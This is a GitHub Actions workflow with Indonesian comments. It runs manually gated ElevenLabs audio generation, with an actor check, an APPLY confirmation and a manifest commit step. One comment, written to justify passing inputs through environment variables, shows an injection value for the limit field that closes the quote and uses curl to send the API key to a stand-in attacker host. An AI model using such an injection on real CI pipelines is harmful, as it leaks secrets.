# m025-150 produksi aset audio ElevenLabs.
#
# Hanya workflow_dispatch. TIDAK ADA pemicu push, schedule, atau pull_request, dan itu
# disengaja: satu-satunya cara kredit terpakai adalah seseorang membukanya dan menekan
# tombol. Mandat V2 pasal 11 meminta batch besar melewati persetujuan manusia, dan
# ketiadaan pemicu otomatis adalah bentuk paling sederhana dari persetujuan itu.
#
# apply bawaannya kosong. Menjalankan workflow ini tanpa mengubah apa pun akan melaporkan
# rencananya dan berhenti - tidak satu karakter pun dikirim.
name: FIEZEL Audio Assets

on:
  workflow_dispatch:
    inputs:
      content:
        description: 'Kumpulan konten: vocabulary | listening | reading'
        required: true
        default: 'vocabulary'
      limit:
        description: 'Jumlah aset maksimum untuk sekali jalan (0 = ikut anggaran manifest)'
        required: false
        default: '50'
      apply:
        description: 'Ketik APPLY untuk benar-benar memproduksi. Selain itu tetap dry-run.'
        required: false
        default: ''
      verify_only:
        description: 'Ketik VERIFY untuk hanya memeriksa kunci dan suara (nol kredit), tanpa memproduksi apa pun.'
        required: false
        default: ''

permissions:
  contents: write

concurrency:
  # Dua jalan bersamaan akan memproduksi kunci yang sama dua kali dan bertabrakan saat
  # menulis manifest. Pasal 5 - satu pekerjaan saja per kunci - dijaga di sini pada
  # tingkat yang paling kasar sekaligus paling sulit dilanggar.
  group: fiezel-audio-generate
  cancel-in-progress: false

jobs:
  generate:
    # Gate aktor — pola yang sama dengan deploy-core-worker.yml:17, configure-core.yml:12,
    # audio-prerender-cf.yml:55, dan audio-deploy-worker.yml.
    #
    # "apply bawaannya kosong" (lihat catatan kepala) melindungi dari kecelakaan, BUKAN dari
    # niat: apply adalah masukan yang diisi si penekan tombol, jadi siapa pun yang bisa
    # men-dispatch cukup mengetik APPLY untuk membelanjakan kredit ElevenLabs owner. Langkah
    # Produksi di bawah memegang ELEVENLABS_API_KEY sekaligus CLOUDFLARE_API_TOKEN, dan
    # workflow ini commit+push ke branch produksi.
    #
    # cf-a7 §2 mendaftar workflow ini sebagai salah satu dari lima pemegang secrets, dan
    # cf-a2 §(d) menandainya "Tidak ada gate aktor". audio-prerender-cf.yml:6-11 sudah
    # menuliskan aturannya lebih dulu: "Jangan mewarisi yang lebih lemah." Di sini yang lemah
    # itu diperbaiki di sumbernya, bukan disalin lagi.
    #
    # Yang TIDAK diubah: ketiadaan pemicu otomatis (cf-a2 "Yang TIDAK boleh diubah") dan
    # gerbang `apply == 'APPLY'` per langkah. Gate aktor adalah lapis tambahan, bukan
    # pengganti persetujuan manusia.
    if: github.event_name == 'workflow_dispatch' && github.actor == 'FIEZEL-APPS'
    runs-on: ubuntu-latest
    # Batas keras: tanpa ini GitHub memakai 360 menit, dan satu langkah
    # yang menggantung membakar enam jam dalam diam (lihat
    # workflow-timeout-gate-test.js).
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'

      # Masukan pengguna TIDAK PERNAH ditanam langsung ke dalam run:. Ia lewat env, dan
      # dibaca sebagai variabel shell yang dikutip.
      #
      # Ini bukan kerapian gaya. Langkah Produksi di bawah memegang ELEVENLABS_API_KEY dan
      # CLOUDFLARE_API_TOKEN di environment-nya; satu dispatch dengan limit berisi
      #   50'; curl -X POST https://penyerang/?k=$ELEVENLABS_API_KEY #
      # akan menutup kutipnya dan mengirim ketiga rahasia itu keluar. Penyamaran log GitHub
      # tidak menghentikan apa pun yang sudah terlanjur dikirim ke jaringan.
      - name: Rencana (dry-run)
        env:
          ELEVENLABS_VOICE_ID: ${{ secrets.ELEVENLABS_VOICE_ID }}
          ELEVENLABS_MODEL_ID: ${{ secrets.ELEVENLABS_MODEL_ID }}
          CONTENT: ${{ inputs.content }}
          LIMIT: ${{ inputs.limit }}
        run: |
          node tools/audio-batch-generate.mjs \
            --content="$CONTENT" \
            --limit="$LIMIT"

      # Nol kredit: hanya bertanya apakah kunci sah dan suaranya sama dengan yang tercatat
      # di manifest. Wajib dijalankan setelah mengganti token, sebelum --apply - lihat
      # catatan --verify-only di tools/audio-batch-generate.mjs.
      - name: Periksa kunci dan suara
        if: ${{ inputs.verify_only == 'VERIFY' }}
        env:
          ELEVENLABS_API_KEY: ${{ secrets.ELEVENLABS_API_KEY }}
          ELEVENLABS_VOICE_ID: ${{ secrets.ELEVENLABS_VOICE_ID }}
          ELEVENLABS_MODEL_ID: ${{ secrets.ELEVENLABS_MODEL_ID }}
          CONTENT: ${{ inputs.content }}
        run: |
          node tools/audio-batch-generate.mjs --content="$CONTENT" --verify-only

      - name: Produksi
        if: ${{ inputs.apply == 'APPLY' && inputs.verify_only != 'VERIFY' }}
        env:
          ELEVENLABS_API_KEY: ${{ secrets.ELEVENLABS_API_KEY }}
          ELEVENLABS_VOICE_ID: ${{ secrets.ELEVENLABS_VOICE_ID }}
          ELEVENLABS_MODEL_ID: ${{ secrets.ELEVENLABS_MODEL_ID }}
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          CONTENT: ${{ inputs.content }}
          LIMIT: ${{ inputs.limit }}
        run: |
          node tools/audio-batch-generate.mjs \
            --content="$CONTENT" \
            --limit="$LIMIT" \
            --apply

      - name: Pemeriksaan rahasia sebelum commit
        if: ${{ inputs.apply == 'APPLY' }}
        run: node audio-asset-pipeline-test.js

      # Yang di-commit hanya manifest. Binernya sudah ada di R2 - lihat catatan kepala
      # tools/audio-batch-generate.mjs tentang mengapa Git tidak dijadikan basis data media.
      - name: Simpan manifest
        if: ${{ inputs.apply == 'APPLY' }}
        env:
          CONTENT: ${{ inputs.content }}
        run: |
          if [ -z "$(git status --porcelain audio/manifest.json)" ]; then
            echo 'Tidak ada aset baru.'
            exit 0
          fi
          git config user.name 'fiezel-audio-bot'
          git config user.email 'noreply@github.com'
          git add audio/manifest.json
          git commit -m "Audio: aset $CONTENT hasil produksi terkendali"
          # Push yang gagal di sini terjadi SETELAH kreditnya terpakai, dan manifest yang
          # tidak mendarat berarti seluruh batch akan diproduksi ulang pada jalan berikutnya.
          # Karena itu ia diulang dengan rebase, bukan dibiarkan gagal sekali lalu menyerah.
          for attempt in 1 2 3; do
            if git push; then exit 0; fi
            echo "Push gagal (percobaan $attempt); menarik perubahan lalu mencoba lagi."
            git pull --rebase --autostash || true
          done
          echo 'Manifest tidak bisa didorong. Aset SUDAH ada di R2; jalankan ulang setelah konflik beres.' >&2
          exit 1
